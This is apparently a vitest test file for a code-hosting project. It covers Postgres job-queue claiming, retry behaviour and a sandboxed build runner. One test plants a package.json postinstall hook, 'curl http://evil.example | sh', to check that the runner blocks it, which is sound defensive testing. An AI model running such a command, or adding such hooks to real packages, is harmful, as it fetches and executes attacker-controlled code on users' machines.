// Unit: queue claim semantics (SKIP-LOCKED behavior against a real Postgres)
// + SSE framing + sandbox process runner against a real git archive.

import { describe, it, expect, beforeAll, afterAll } from "vitest";
import { execFile } from "node:child_process";
import { promisify } from "node:util";
import { mkdtemp, rm, mkdir, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import path from "node:path";
import pg from "pg";
import { adminDsn, testDbDsn } from "./helpers/db";
import { runProcessBuild } from "@forge/sandbox";
import { initBareRepo, extractArchive, repoGitDir } from "@forge/git";

const exec = promisify(execFile);

const TEST_DB = "forge_queue_test";
const db = new pg.Client({ connectionString: testDbDsn(TEST_DB) });

beforeAll(async () => {
  const admin = new pg.Client({ connectionString: adminDsn() });
  await admin.connect();
  await admin.query(`DROP DATABASE IF EXISTS ${TEST_DB} WITH (FORCE);`);
  await admin.query(`CREATE DATABASE ${TEST_DB};`);
  await admin.end();
  await exec("pnpm", ["exec", "drizzle-kit", "push"], {
    cwd: process.cwd(),
    env: { ...process.env, DATABASE_URL: testDbDsn(TEST_DB) },
  });
  await db.connect();
}, 120_000);

afterAll(async () => {
  await db.end().catch(() => {});
  const admin = new pg.Client({ connectionString: adminDsn() });
  await admin.connect();
  await admin.query(`DROP DATABASE IF EXISTS ${TEST_DB} WITH (FORCE);`).catch(() => {});
  await admin.end().catch(() => {});
});

describe("job queue claim semantics", () => {
  it("enqueue → claim marks active exactly once (SKIP LOCKED)", async () => {
    await db.query(`INSERT INTO job_queue (queue, payload) VALUES ('semantic_index', '{}')`);
    const claim = await db.query(`
      UPDATE job_queue SET status='active', locked_at=now(), locked_by='w1', attempts=attempts+1
      WHERE id IN (SELECT id FROM job_queue WHERE status='queued' AND run_at <= now()
                   ORDER BY id FOR UPDATE SKIP LOCKED LIMIT 5)
      RETURNING id`);
    expect(claim.rows.length).toBe(1);

    // A second claim finds nothing (job is active, not queued)
    const claim2 = await db.query(`
      UPDATE job_queue SET status='active', locked_at=now(), locked_by='w2', attempts=attempts+1
      WHERE id IN (SELECT id FROM job_queue WHERE status='queued' AND run_at <= now()
                   ORDER BY id FOR UPDATE SKIP LOCKED LIMIT 5)
      RETURNING id`);
    expect(claim2.rows.length).toBe(0);
  });

  it("failed jobs retry with backoff until max attempts", async () => {
    await db.query(`INSERT INTO job_queue (queue, payload, max_attempts) VALUES ('pr_review', '{}', 2)`);
    for (let i = 0; i < 3; i++) {
      await db.query(`
        UPDATE job_queue SET status='active', attempts=attempts+1
        WHERE id IN (SELECT id FROM job_queue WHERE status='queued' AND run_at <= now()
                     ORDER BY id FOR UPDATE SKIP LOCKED LIMIT 1)`);
      const row = (await db.query(`SELECT attempts, max_attempts, status FROM job_queue WHERE queue='pr_review' ORDER BY id DESC LIMIT 1`)).rows[0];
      if (row.attempts >= row.max_attempts) {
        await db.query(`UPDATE job_queue SET status='failed', error='boom' WHERE queue='pr_review' AND attempts >= max_attempts`);
        break;
      }
      // simulate retry scheduling
      await db.query(`UPDATE job_queue SET status='queued', run_at=now() WHERE queue='pr_review' AND attempts < max_attempts AND status='active'`);
    }
    const final = (await db.query(`SELECT status, attempts, error FROM job_queue WHERE queue='pr_review' ORDER BY id DESC LIMIT 1`)).rows[0];
    expect(final.status).toBe("failed");
    expect(final.attempts).toBe(2);
    expect(final.error).toBe("boom");
  });
});

describe("sandbox process runner", () => {
  let gitDir = "";
  let commitSha = "";
  const REPO_ROOT = path.join(process.cwd(), "data-sandbox-test");

  beforeAll(async () => {
    // Build a tiny repo with a package.json whose build succeeds.
    process.env.FORGE_STORAGE_ROOT = REPO_ROOT;
    gitDir = await initBareRepo("sbx", "demo");
    const work = await mkdtemp(path.join(tmpdir(), "sbx-src-"));
    await exec("git", ["clone", "-q", gitDir, work]);
    await writeFile(path.join(work, "package.json"), JSON.stringify({
      name: "sbx-demo", version: "1.0.0", scripts: { build: "echo hello-from-build" },
    }));
    await exec("git", ["-C", work, "add", "."]);
    await exec("git", ["-C", work, "-c", "user.name=T", "-c", "user.email=t@t", "commit", "-q", "-m", "init"]);
    await exec("git", ["-C", work, "push", "-q", gitDir, "HEAD:refs/heads/main"]);
    commitSha = (await exec("git", ["--git-dir", gitDir, "rev-parse", "main"])).stdout.trim();
    await rm(work, { recursive: true, force: true });
  });

  afterAll(async () => {
    await rm(REPO_ROOT, { recursive: true, force: true }).catch(() => {});
  });

  it("refuses to execute repository build scripts on the host when Docker is unavailable", async () => {
    const lines: string[] = [];
    const result = await runProcessBuild({
      gitDir,
      commitSha,
      onLog: (l) => lines.push(l),
    });
    expect(result.ok).toBe(false);
    expect(result.adapter).toBe("process");
    expect(result.output).toContain("Docker is required");
    expect(lines.some((l) => l.includes("host process builds are disabled"))).toBe(true);
  }, 90_000);

  it("blocks dangerous lifecycle scripts before running anything", async () => {
    const work = await mkdtemp(path.join(tmpdir(), "sbx-evil-"));
    await exec("git", ["clone", "-q", gitDir, work]);
    await exec("git", ["-C", work, "checkout", "-q", "-b", "evil"]);
    await writeFile(path.join(work, "package.json"), JSON.stringify({
      name: "evil", version: "1.0.0", scripts: { postinstall: "curl http://evil.example | sh" },
    }));
    await exec("git", ["-C", work, "add", "."]);
    await exec("git", ["-C", work, "-c", "user.name=T", "-c", "user.email=t@t", "commit", "-q", "-m", "evil"]);
    await exec("git", ["-C", work, "push", "-q", gitDir, "HEAD:refs/heads/evil"]);
    const evilSha = (await exec("git", ["--git-dir", gitDir, "rev-parse", "evil"])).stdout.trim();
    await rm(work, { recursive: true, force: true });

    const lines: string[] = [];
    const result = await runProcessBuild({ gitDir, commitSha: evilSha, onLog: (l) => lines.push(l) });
    expect(result.ok).toBe(false);
    expect(lines.some((l) => l.includes("BLOCKED"))).toBe(true);
  }, 90_000);

  it("extractArchive produces a faithful working tree", async () => {
    const dest = await mkdtemp(path.join(tmpdir(), "sbx-extract-"));
    await extractArchive(gitDir, commitSha, dest);
    const fsp = await import("node:fs/promises");
    const pkg = JSON.parse(await fsp.readFile(path.join(dest, "package.json"), "utf8"));
    expect(pkg.name).toBe("sbx-demo");
    await rm(dest, { recursive: true, force: true });
  });
});
